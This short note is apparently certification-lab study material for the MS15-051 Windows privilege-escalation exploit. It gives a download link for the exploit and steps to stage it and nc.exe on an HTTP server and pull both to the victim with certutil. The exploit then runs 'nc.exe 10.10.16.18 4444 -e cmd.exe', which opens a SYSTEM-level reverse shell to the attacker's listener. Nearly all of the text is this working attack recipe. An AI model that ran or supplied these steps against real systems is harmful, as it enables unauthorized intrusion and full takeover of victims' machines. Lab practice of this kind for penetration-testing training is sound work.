# Tested payload
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

# Steps to prepare payload
1. Download the zip file -> Extract it to a folder
2. Use the exe file that maches the System Architecture of the victim's machine.

# Steps to exploit
1. Create a simple HTTP file server to host it (see https://github.com/hoangtrungkien/PNPT/tree/main/Delivery)
2. Also copy nc.exe to this transfer folder
2. From victim's machine, get the nc.exe file and ms*.exe file (using certutil -> see https://github.com/hoangtrungkien/PNPT/tree/main/Delivery)
4. Run the ms15.exe file
Assumptions: Attack machine: 10.10.16.18 / already run nc -nvlp 4444  
From Victim's machine: ms15.exe "nc.exe 10.10.16.18 4444 -e cmd.exe"
From Attack machine - in the nc4444 screen -> will see connection with system privilege.
